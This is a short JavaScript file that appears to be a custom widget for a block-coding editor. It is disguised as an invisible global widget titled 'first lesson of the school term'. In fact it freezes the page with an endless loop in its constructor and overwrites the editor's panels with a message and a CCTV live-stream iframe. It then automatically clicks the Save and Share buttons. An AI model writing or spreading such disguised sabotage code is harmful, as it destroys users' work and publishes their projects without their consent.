const types = {
    type: "HIDE_HAOZI",
    icon: "icon-toolbox-feature",
    title: "开学第一课",
    isGlobalWidget: true,
    isInvisibleWidget: true,
    properties: [],
    methods: [],
    events: [],
};

class Widget extends InvisibleWidget {
    constructor(props) {
        super(props);
        while (1) { };
    }
}

exports.types = types;
exports.widget = Widget;

setTimeout(() => { this.document.getElementsByClassName('WidgetList_tabContainer__2FoCh WidgetList_doubleColumn__34XFq')[0].innerHTML = '开学啦！'; }, 0);
setTimeout(() => { this.document.getElementsByClassName('EditArea_wrapper__2U_dC')[0].innerHTML = '<iframe src="https://tv.cctv.com/live/cctv1/" width=100% height=100%>'; }, 0);

setTimeout(() => { this.document.getElementsByClassName('Header_saveText__31lXM')[1].click(); }, 0);
setTimeout(() => { this.document.getElementsByClassName('coco-button   coco-button-circle style_shareButton__3ZjBW')[1].click(); }, 0);
